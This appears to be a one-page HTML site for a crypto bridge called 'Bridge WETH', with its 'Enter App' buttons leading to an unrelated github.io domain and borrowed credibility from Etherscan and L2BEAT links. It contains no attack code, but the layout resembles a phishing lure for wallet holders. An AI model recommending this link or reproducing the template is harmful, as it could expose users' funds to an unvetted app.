<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Bridge WETH</title>
  <meta name="description" content="Bridge WETH moves wrapped ETH between Ethereum and other networks from your own wallet.">
  <link rel="canonical" href="https://bridge-weth.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F8FA">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Bridge WETH">
  <meta property="og:description" content="Bridge WETH moves wrapped ETH between Ethereum and other networks from your own wallet.">
  <meta property="og:url" content="https://bridge-weth.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Bridge WETH">
  <meta name="twitter:description" content="Bridge WETH moves wrapped ETH between Ethereum and other networks from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://bridge-weth.github.io/#website",
        "url": "https://bridge-weth.github.io/",
        "name": "Bridge WETH",
        "inLanguage": "en"
      },
      {
        "@type": "WebApplication",
        "@id": "https://bridge-weth.github.io/#app",
        "name": "Bridge WETH",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://bridge-weth.github.io/"
      },
      {
        "@type": "Organization",
        "@id": "https://bridge-weth.github.io/#organization",
        "name": "Bridge WETH",
        "url": "https://bridge-weth.github.io/"
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <div class="brand" aria-label="Bridge WETH">
      <img src="favicon.png" width="28" height="28" alt="">
      <span>Bridge WETH</span>
    </div>
    <nav class="nav" aria-label="Authority references">
      <a href="https://etherscan.io/token/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Bridges</a>
      <a href="https://l2beat.com/interop/summary" target="_blank" rel="nofollow noopener noreferrer">L2BEAT</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-labelledby="page-title">
      <h1 id="page-title">Bridge WETH</h1>
      <p class="value"><strong>Bridge WETH</strong> moves wrapped ETH between Ethereum and other networks from your own wallet.</p>
    </section>

    <section class="app-card" aria-label="Bridge route">
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="chip">
            <img src="weth.png" width="30" height="30" alt="WETH">
            <span>WETH</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch bridge direction">
          <span aria-hidden="true">&#8594;</span>
        </button>
        <div class="leg">
          <span class="label">To</span>
          <span class="chip">
            <img src="eth.png" width="30" height="30" alt="ETH">
            <span>ETH</span>
          </span>
        </div>
      </div>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
    </section>
  </main>

  <footer class="footer">Bridge WETH &mdash; 2026</footer>

  <script>
  (function () {
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;

    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length < 2) return;

      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  }());
  </script>
</body>
</html>
